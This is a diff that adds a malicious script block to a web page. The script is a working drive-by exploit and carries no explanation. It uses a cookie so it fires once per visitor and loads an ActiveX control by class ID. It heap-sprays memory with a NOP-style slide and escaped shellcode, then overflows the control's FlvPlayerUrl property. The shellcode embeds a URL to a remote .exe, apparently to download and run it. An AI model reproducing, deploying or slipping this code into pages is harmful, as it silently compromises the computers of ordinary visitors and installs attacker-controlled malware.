@@ -1,0 +1,56 @@
+<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>
+<SCRIPT language="JavaScript">
+var expires = new Date();
+expires.setTime(expires.getTime() + 24 * 60 * 60 * 1000);
+var set_cookie = document.cookie.indexOf("3Ware="); 
+if (set_cookie == -1){document.cookie = "3Ware=1;expires=" + expires.toGMTString();
+document.write('<object id="gl" classid="clsid:F3E70CEA-956E-49CC-B444-73AFE593AD7F"></object>');
+var helloworld2Address = 0x0c0c0c0c;
+var shellcode = unescape("%u4343"+"%u4343"+"%u4343" + 
+"%ua3e9%u0000%u5f00%ua164%u0030%u0000%u408b%u8b0c" +
+"%u1c70%u8bad%u0868%uf78b%u046a%ue859%u0043%u0000" +
+"%uf9e2%u6f68%u006e%u6800%u7275%u6d6c%uff54%u9516" +
+"%u2ee8%u0000%u8300%u20ec%udc8b%u206a%uff53%u0456" +
+"%u04c7%u5c03%u2e61%uc765%u0344%u7804%u0065%u3300" +
+"%u50c0%u5350%u5057%u56ff%u8b10%u50dc%uff53%u0856" +
+"%u56ff%u510c%u8b56%u3c75%u748b%u782e%uf503%u8b56" +
+"%u2076%uf503%uc933%u4149%u03ad%u33c5%u0fdb%u10be" +
+"%ud63a%u0874%ucbc1%u030d%u40da%uf1eb%u1f3b%ue775" +
+"%u8b5e%u245e%udd03%u8b66%u4b0c%u5e8b%u031c%u8bdd" +
+"%u8b04%uc503%u5eab%uc359%u58e8%uffff%u8eff%u0e4e" +
+"%uc1ec%ue579%u98b8%u8afe%uef0e%ue0ce%u3660%u2f1a" +
+"%u6870%u7474%u3A70%u2F2F%u7777%u2E77%u614C%u446F%u6E69%u2E67%u654E%u2F74%u6153%u536E%u6D69%u652E%u6578%u0000");
+var hbshelloworld = 0x100000;
+var payLoadSize = shellcode.length * 2;
+var spraySlideSize = hbshelloworld - (payLoadSize+0x38);
+var spraySlide = unescape("%u0D0D%u0D0D");
+spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+heapBlocks = (helloworld2Address - 0x100000)/hbshelloworld;
+memory = new Array();
+for (i=0;i<heapBlocks;i++)
+{
+      memory[i] = spraySlide + shellcode;
+}
+
+function getSpraySlide(spraySlide, spraySlideSize)
+{
+	while (spraySlide.length*2<spraySlideSize)
+	{
+		  spraySlide += spraySlide;
+	}
+	spraySlide = spraySlide.substring(0,spraySlideSize/2);
+	return spraySlide;
+}
+
+var size_buff = 1070;
+var x =  unescape("%0c%0c%0c%0c");
+while (x.length<size_buff) x += x;
+gl.FlvPlayerUrl = x;
+}
+</SCRIPT>
+<script>
+if (set_cookie == -1){
+location.reload();
+}
+</script>
+
